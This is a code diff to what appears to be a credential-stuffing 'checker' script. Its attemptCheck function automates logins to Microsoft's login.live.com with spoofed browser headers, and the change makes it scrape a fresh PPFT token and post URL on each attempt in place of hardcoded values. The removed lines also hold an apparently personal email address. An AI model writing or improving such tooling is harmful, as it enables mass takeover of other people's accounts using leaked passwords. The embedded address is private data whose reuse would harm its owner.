@@ -208,29 +208,15 @@ const SERVICES = [
   { keyword: "strava", label: "Strava", category: "Health" },
 ];
 
-const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
+const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0";
 const MAX_RETRIES = 3;
 const RETRY_DELAY = 2000;
 
-const LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";
+const AUTHORIZE_URL = "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch";
 
-const LOGIN_HEADERS = {
-  "Host": "login.live.com",
-  "Connection": "keep-alive",
-  "Cache-Control": "max-age=0",
-  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
-  "sec-ch-ua-mobile": "?0",
-  "sec-ch-ua-platform": '"Windows"',
-  "Upgrade-Insecure-Requests": "1",
-  "Origin": "https://login.live.com",
-  "Content-Type": "application/x-www-form-urlencoded",
+const COMMON_HEADERS = {
   "User-Agent": USER_AGENT,
   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-  "Sec-Fetch-Site": "same-origin",
-  "Sec-Fetch-Mode": "navigate",
-  "Sec-Fetch-User": "?1",
-  "Sec-Fetch-Dest": "document",
-  "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
   "Accept-Language": "en-US,en;q=0.9",
   "Accept-Encoding": "gzip, deflate",
 };
@@ -361,11 +347,40 @@ async function attemptCheck(email, password) {
   const cookieJar = createCookieJar();
 
   try {
-    // ── Step 1: Login ──
+    // ── Step 1: GET login page for fresh PPFT + urlPost ──
+    const preAuthResp = await sessionFetch(AUTHORIZE_URL, {
+      method: "GET",
+      headers: { ...COMMON_HEADERS },
+      signal: AbortSignal.timeout(15000),
+    }, cookieJar);
+
+    const preAuthBody = await preAuthResp.text();
+    const preAuthUrl = preAuthResp._finalUrl || preAuthResp.url;
+
+    // Extract PPFT
+    let ppft = parseLR(preAuthBody, 'name="PPFT" id="i0327" value="', '"');
+    if (!ppft) ppft = parseLR(preAuthBody, "sFT:'", "'");
+    if (!ppft) ppft = parseLR(preAuthBody, 'sFTTag:\'<input type="hidden" name="PPFT" id="i0327" value="', '"');
+    if (!ppft) {
+      result.status = "retry";
+      result.detail = "PPFT not found";
+      return result;
+    }
+
+    // Extract urlPost
+    let urlPost = parseLR(preAuthBody, "urlPost:'", "'");
+    if (!urlPost) urlPost = parseLR(preAuthBody, 'urlPost:"', '"');
+    if (!urlPost) {
+      result.status = "retry";
+      result.detail = "urlPost not found";
+      return result;
+    }
+
+    // ── Step 2: POST login with fresh values ──
     const postData = new URLSearchParams({
       ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
       canary: "", ctx: "", hpgrequestid: "",
-      PPFT: "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$",
+      PPFT: ppft,
       PPSX: "PassportRN", NewUser: "1", FoundMSAs: "",
       fspost: "0", i21: "0", CookieDisclosure: "0",
       IsFidoSupported: "1", isSignupPost: "0", isRecoveryAttemptPost: "0",
@@ -374,9 +389,25 @@ async function attemptCheck(email, password) {
       hisRegion: "", hisScaleUnit: "", passwd: password,
     });
 
-    const resp = await sessionFetch(LOGIN_URL, {
+    const resp = await sessionFetch(urlPost, {
       method: "POST",
-      headers: { ...LOGIN_HEADERS },
+      headers: {
+        "Host": "login.live.com",
+        "Connection": "keep-alive",
+        "Cache-Control": "max-age=0",
+        "Origin": "https://login.live.com",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": USER_AGENT,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Referer": preAuthUrl,
+        "Upgrade-Insecure-Requests": "1",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate",
+      },
       body: postData.toString(),
       signal: AbortSignal.timeout(20000),
     }, cookieJar);
